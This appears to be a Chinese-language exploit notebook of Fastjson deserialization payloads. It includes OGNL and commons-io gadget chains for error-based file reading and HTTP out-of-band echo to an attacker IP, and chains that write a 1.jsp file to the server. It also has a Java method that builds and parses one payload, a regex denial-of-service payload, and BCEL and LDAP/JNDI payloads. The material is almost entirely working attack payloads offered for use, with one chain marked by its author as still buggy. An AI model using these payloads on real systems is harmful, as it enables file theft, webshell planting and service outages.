```xml
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>  
<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>
```

```json
{
	"su14": {
		"@type": "java.lang.Exception",
		"@type": "ognl.OgnlException"
	},
	"su15": {
		"@type": "java.lang.Class",
		"val": {
			"@type": "com.alibaba.fastjson.JSONObject",
			{
				"@type": "java.lang.String"
				"@type": "ognl.OgnlException",
				"_evaluation": ""
			}
		},
		"su16": {
			"@type": "ognl.Evaluation",
			"node": {
				"@type": "ognl.ASTMethod",
				"p": {
					"@type": "ognl.OgnlParser",
					"stream": {
						"@type": "org.apache.commons.io.input.BOMInputStream",
						"delegate": {
							"@type": "org.apache.commons.io.input.ReaderInputStream",
							"reader": {
								"@type": "jdk.nashorn.api.scripting.URLReader",
								"url": "file://tmp"
							},
							"charsetName": "UTF-8",
							"bufferSize": 1024
						},
						"boms": [{
							"@type": "org.apache.commons.io.ByteOrderMark",
							"charsetName": "UTF-8",
							"bytes": [
								116,101,115,116
							]
						}]
					}
				}
			}
		},
		"su17": {
			"$ref": "$.su16.node.p.stream"
		},
		"su18": {
			"$ref": "$.su17.bOM.bytes"
		}
	}
```

### 利用报错布尔
```json
[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}},
{"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file://tmp"
          },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
116,101,115,116]}]
}}}}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}},{"su19":{
"$ref":"$[3].su18.bOM.bytes"}},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su21" : {"$ref":"$[5].su20.node.p.stream"}}]
```

### http报错回显
```json
[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}},
{"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file://tmp"
          },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
98]}]
}}}}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}},{"su19":{
"$ref":"$[3].su18.bOM.bytes"}},{"su22":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":"http://192.168.66.136:1234/","country":{"@type":"java.lang.String"{"$ref":"115"}}}}},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su23" : {"$ref":"$[5].su22.node.p.stream"}},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}}},{"su21" : {"$ref":"$[7].su20.node.p.stream"}}]
```

## ognl + io 写文件（链子有问题，还要调一下）
### cc低版本 2.0 -2.6
```xml
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>  
<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>
```

```json
{
    "su14": {
        "@type": "java.lang.Exception",
        "@type": "ognl.OgnlException"
    },
    "su15": {
        "@type": "java.lang.Class",
        "val": {
            "@type": "com.alibaba.fastjson.JSONObject",
            {
                "@type": "java.lang.String"
                "@type": "ognl.OgnlException",
                "_evaluation": ""
            }
        },
        "su16": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""test8200个a"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
            "branch":{
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"1.jsp",
        "encoding":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su17": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su18": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su19": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        }   
    }
```

### cc 高版本 2.7 2.8
```json
{
    "su14": {
        "@type": "java.lang.Exception",
        "@type": "ognl.OgnlException"
    },
    "su15": {
        "@type": "java.lang.Class",
        "val": {
            "@type": "com.alibaba.fastjson.JSONObject",
            {
                "@type": "java.lang.String"
                "@type": "ognl.OgnlException",
                "_evaluation": ""
            }
        },
        "su16": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""test8200个a",
        "start":0,
        "end":2147483647
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
            "branch":{
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"1.jsp",
        "charsetName":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su17": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su18": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        },
        "su19": {
            "@type": "ognl.Evaluation",
            "node": {
                "@type": "ognl.ASTMethod",
                "p": {
                    "@type": "ognl.OgnlParser",
                    "stream": {
                        "@type": "org.apache.commons.io.input.BOMInputStream",
                        "delegate": {
                            "@type": "org.apache.commons.io.input.ReaderInputStream",
                            "reader": {
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
                            "charsetName": "UTF-8",
                            "bufferSize": 1024
                        },
                        "boms": [{
                            "@type": "org.apache.commons.io.ByteOrderMark",
                            "charsetName": "UTF-8",
                            "bytes": [
                                36,82
                            ]
                        }]
                    }
                }
            }
        }    
    }
```

## ognl + io + aspectj + commons-codec 写文件
需要写入文件大于 8kb
```xml
<dependency>  
    <groupId>commons-codec</groupId>  
    <artifactId>commons-codec</artifactId>  
    <version>1.6</version>  
</dependency>

<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>
<dependency>  
    <groupId>org.aspectj</groupId>  
    <artifactId>aspectjtools</artifactId>  
    <version>1.9.8</version>  
</dependency>
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>
```

```java
public void ognl_io_aspectj_code_write(){  
    String str = "test";  
    for (int i = 0; i < 8201; i++){  
        str += "a";  
    }  
  
    byte[] sb = str.getBytes();  
    String baseStr = Base64.getEncoder().encodeToString(sb);  
    byte[] bytes = baseStr.getBytes();  
  
  
    String payload = "\r\n"  
            + "{\r\n"  
            + "    \"su14\": {\r\n"  
            + "       \"@type\": \"java.lang.Exception\",\r\n"  
            + "       \"@type\": \"ognl.OgnlException\"\r\n"  
            + "    },\r\n"  
            + "    \"su15\": {\r\n"  
            + "       \"@type\": \"java.lang.Class\",\r\n"  
            + "       \"val\": {\r\n"  
            + "          \"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"  
            + "          {\r\n"  
            + "             \"@type\": \"java.lang.String\"\r\n"  
            + "             \"@type\": \"ognl.OgnlException\",\r\n"  
            + "             \"_evaluation\": \"\"\r\n"  
            + "          }\r\n"  
            + "       },\r\n"  
            + "       \"su16\": {\r\n"  
            + "          \"@type\": \"ognl.Evaluation\",\r\n"  
            + "          \"node\": {\r\n"  
            + "             \"@type\": \"ognl.ASTMethod\",\r\n"  
            + "             \"p\": {\r\n"  
            + "                \"@type\": \"ognl.OgnlParser\",\r\n"  
            + "                \"stream\": {\r\n"  
            + "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\r\n"  
            + "  \"delegate\":{\r\n"  
            + "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"  
            + "    \"input\":{\r\n"  
            + "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\r\n"  
            + "      \"in\":{\r\n"  
            + "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\r\n"  
            + "        \"charset\":\"utf-8\",\r\n"  
            + "        \"bufferSize\": 1024,\r\n"  
            + "        \"s\":{\"@type\":\"java.lang.String\"\""+baseStr+"\"\r\n"  
            + "      },\r\n"  
            + "      \"doEncode\":false,\r\n"  
            + "      \"lineLength\":1024,\r\n"  
            + "      \"lineSeparator\":\"5ZWKCg==\",\r\n"  
            + "      \"decodingPolicy\":0\r\n"  
            + "    },\r\n"  
            + "    \"branch\":{\r\n"  
            + "      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\r\n"  
            + "      \"targetPath\":\"1.jsp\"\r\n"  
            + "    },\r\n"  
            + "    \"closeBranch\":true\r\n"  
            + "  },\r\n"  
            + "  \"include\":true,\r\n"  
            + "  \"boms\":[{\r\n"  
            + "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"  
            + "                  \"charsetName\": \"UTF-8\",\r\n"  
            + "                  \"bytes\":"+Arrays.toString(bytes)+"\r\n"  
            + "                }],\r\n"  
            + "}\r\n"  
            + "             }\r\n"  
            + "          }\r\n"  
            + "       },\r\n"  
            + "       \"su17\": {\r\n"  
            + "          \"$ref\": \"$.su16.node.p.stream\"\r\n"  
            + "       },\r\n"  
            + "       \"su18\": {\r\n"  
            + "          \"$ref\": \"$.su17.bOM.bytes\"\r\n"  
            + "       }\r\n"  
            + "    }";  
    System.out.println(payload);  
    JSON.parseObject(payload);  
}
```





# 无@type利用
对于 Fastjson 1.2.36-1.2.62 的版本存在dos漏洞
https://b1ue.cn/archives/314.html
```json
{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}

{"regex":{"$ref":"$[\blue = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```



# 待测试
mybatis 测试
```
{
  "@type": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource",
  "key": {
    "@type": "java.lang.Class",
    "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
  },
  "driverClassLoader": {
    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
  },
  "driver": "$$BCEL$$xxxxxxx"
}
```

1.2.68
```

{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://0.0.0.0"}
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://0.0.0.0"}
```

1.2.68的写?
```
{
    'stream':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'java.io.FileOutputStream',
        'file':'temp',
        'append':false
    },
    'writer':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.apache.solr.common.util.FastOutputStream',
        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',
        'sink':
        {
            '$ref':'$.stream'
        },
        'start':38
    },
    'close':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.iq80.snappy.SnappyOutputStream',
        'out':
        {
            '$ref':'$.writer'
        }
    }
}
```

